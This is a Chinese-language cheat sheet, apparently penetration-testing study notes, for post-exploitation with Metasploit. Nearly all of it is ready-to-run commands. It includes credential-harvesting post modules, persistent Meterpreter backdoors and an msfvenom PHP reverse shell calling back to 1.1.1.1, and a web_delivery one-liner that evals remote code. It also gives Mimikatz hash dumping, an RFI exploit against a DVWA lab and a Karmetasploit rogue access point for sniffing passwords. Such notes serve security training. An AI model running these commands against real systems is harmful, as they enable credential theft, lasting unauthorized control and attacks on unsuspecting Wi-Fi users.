
# 后渗透测试阶段（三）

* POST 模块
* 自动执行模块
* 后门
* Mimikatz
* Web
* RFI 远程文件包含
* Karmetasploit

## POST 模块
``` 
run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24
run post/windows/gather/checkvm
run post/windows/gather/credentials/credential_collector
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_snmp
run post/multi/recon/local_exploit_suggester
run post/windows/manage/delete_user USERNAME=yuanfh
run post/multi/gather/env
run post/multi/gather/firefox_creds
run post/multi/gather/ssh_creds
run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe
```


## 自动执行模块
* 自动执行meterpreter脚本
``` 
set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com
set InitialAutoRunScript checkvm
```

* 自动执行post 模块
``` 
set InitialAutoRunScript migrate -n explorer.exe
set AutoRunScript post/windows/gather/dumplinks
```


## 后门
* 持久后门
> 利用漏洞取得的meterpreter shell 运行于内存中，重启失效  
> 重复 exploit 漏洞可能造成服务崩溃  
> 持久后门保证漏洞修复后仍可远程控制


* Meterpreter 后门
``` 
run metsvc -A 　　　　　　# 删除 -r
use exploit/multi/handler
set PAYLOAD windows/metsvc_bind_tcp
set LPORT 31337
set RHOST 1.1.1.1

```

* 持久后门
``` 
run persistence -h
run persistence -X -i 10 -p 4444 -r 1.1.1.1
run persistence -U -i 20 -p 4444 -r 1.1.1.1
run persistence -S -i 20 -p 4444 -r 1.1.1.1
```

## Mimikatz
``` 
getsystem
load mimikatz
wdigest 、kerberos 、msv、ssp 、tspkg 、livessp
mimikatz_command -h
mimikatz_command -f a::
mimikatz_command -f samdump::hashes
mimikatz_command -f handle::list
mimikatz_command -f service::list
mimikatz_command -f crypto::listProviders
mimikatz_command -f winmine::infos
```


## Web
* PHP shell
``` 
msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f  raw -o a.php
// MSF 启动侦听
// 上传到 web 站点并通过浏览器访问
```

* Web Delivery
``` 
// 利用代码执行漏洞访问攻击者服务器
use exploit/multi/script/web_delivery
set target 1
php -d allow_url_fopen=true -r “eval(file_get_contents(‘http://1.1.1.1/fTYWqmu'));"
```

## RFI 远程文件包含
``` 
vi /etc/php5/cgi/php.ini　　　　　　 //   php info 配置文件
    allow_url_fopen = On
    allow_url_include = On
use exploit/unix/webapp/php_include
set RHOST 1.1.1.2
set PATH /dvwa/vulnerabilities/fi/
set PHPURI /?page=XXpathXX
set HEADERS "Cookie:security=low;PHPSESSID=eefcf023ba61219d4745ad7487fe81d7"
set payload php/meterpreter/reverse_tcp
set lhost 1.1.1.1
exploit
```

## Karmetasploit

* 描述
> 伪造AP、嗅探密码、截获数据、浏览器攻击  
> wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt

* 安装其他依赖包
``` 
 gem install activerecord sqlite3-ruby
```

* 基础架构安装配置
``` 
apt-get install isc-dhcp-server
cat /etc/dhcp/dhcpd.conf
　　option domain-name-servers 10.0.0.1;
　　default-lease-time 60;
　　max-lease-time 72;
　　ddns-update-style none;
　　authoritative;
　　log-facility local7;
　　subnet 10.0.0.0 netmask 255.255.255.0 {
　　　　range 10.0.0.100 10.0.0.254;
　　　　option routers 10.0.0.1;
　　　　option domain-name-servers 10.0.0.1;
　　}
```
* 伪造AP
``` 
airmon-ng start wlan0
airbase-ng -P -C 30 -e "FREE" -v wlan0mon
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
touch /var/lib/dhcp/dhcpd.leases
dhcpd -cf /etc/dhcp/dhcpd.conf at0
```

* 启动 Karmetasploit
``` 
msfconsole -q -r karma.rc_.txt
```

* 允许用户正常上网
``` 
vi karma.rc_.txt
// 删除 setg 参数
// 增加 browser_autopwn2 等其他模块
// 检查恶意流量：auxiliary/vsploit/malware/dns*
```

*  启动 Karmetasploit
``` 
msfconsole -q -r karma.rc_.txt
```

* 添加路由和防火墙规则（iptables）
``` 
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```





